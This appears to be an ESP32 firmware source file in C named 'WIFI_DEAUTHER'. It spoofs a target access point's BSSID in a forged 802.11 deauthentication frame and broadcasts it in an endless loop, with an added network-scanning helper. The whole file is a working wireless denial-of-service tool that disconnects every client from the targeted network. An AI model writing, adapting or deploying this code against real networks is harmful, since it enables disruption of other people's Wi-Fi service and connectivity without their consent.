#include <stdio.h>
#include <string.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "esp_log.h"

static const char *TAG = "WIFI_DEAUTHER";
#define MAC2STR(mac) (mac)[0], (mac)[1], (mac)[2], (mac)[3], (mac)[4], (mac)[5]
#define MACSTR "%02x:%02x:%02x:%02x:%02x:%02x"

// Target AP's BSSID (replace with your AP's MAC address)
uint8_t target_bssid[6] = {0xf6, 0x3e, 0x9b, 0x08, 0xd2, 0x46};

// void wifi_init(void)
// {
//     // Initialize NVS (non-volatile storage)
//     esp_err_t ret = nvs_flash_init();
//     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
//     {
//         ESP_ERROR_CHECK(nvs_flash_erase());
//         ret = nvs_flash_init();
//     }
//     ESP_ERROR_CHECK(ret);
//     // Initialize the event loop
//     ESP_ERROR_CHECK(esp_event_loop_create_default());
//     // Initialize WiFi
//     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
//     ESP_ERROR_CHECK(esp_wifi_init(&cfg));
//     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
//     ESP_ERROR_CHECK(esp_wifi_start());
//     // Set promiscuous mode (not strictly needed for sending, but useful for debugging)
//     ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
//     ESP_LOGI(TAG, "WiFi initialized");
// }

uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0x07, 0x00                          // Reason Code
};

void print_frame(const uint8_t *frame, size_t length)
{
    for (size_t i = 0; i < length; i++)
    {
        printf("%02X ", frame[i]);
        if ((i + 1) % 16 == 0) // Print 16 bytes per line
        {
            printf("\n");
        }
    }
    printf("\n");
}

void scan_networks(void)
{
    wifi_scan_config_t scan_config = {0};
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
    uint16_t ap_count = 0;
    esp_wifi_scan_get_ap_num(&ap_count);
    wifi_ap_record_t ap_records[20];
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_records));

    ESP_LOGI(TAG, "----------------------- STARTING SCAN ----------------------");
    for (int i = 0; i < ap_count; i++)
    {
        ESP_LOGI(TAG, "AP: %s, BSSID: " MACSTR, ap_records[i].ssid, MAC2STR(ap_records[i].bssid));
    }
}

void deauth_task(void *pvParameters)
{

    memcpy(&deauth_frame[10], target_bssid, 6); // Source Address
    memcpy(&deauth_frame[16], target_bssid, 6); // BSSID

    ESP_LOGI(TAG, "DEAUTH FRAME");
    print_frame(deauth_frame, sizeof(deauth_frame));

    ESP_LOGI(TAG, "Starting deauth attack...");

    while (1)
    {
        esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
        if (ret == ESP_OK)
        {
            ESP_LOGI(TAG, "Sent deauth packet");
        }
        else
        {
            ESP_LOGE(TAG, "Failed to send packet: %s", esp_err_to_name(ret));
        }
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
}

void app_main()
{
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND)
    {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    // while (true)
    // {
    //     scan_networks();
    //     vTaskDelay(5000);
    // }

    xTaskCreate(deauth_task, "deauth_task", 4096, NULL, 5, NULL);
}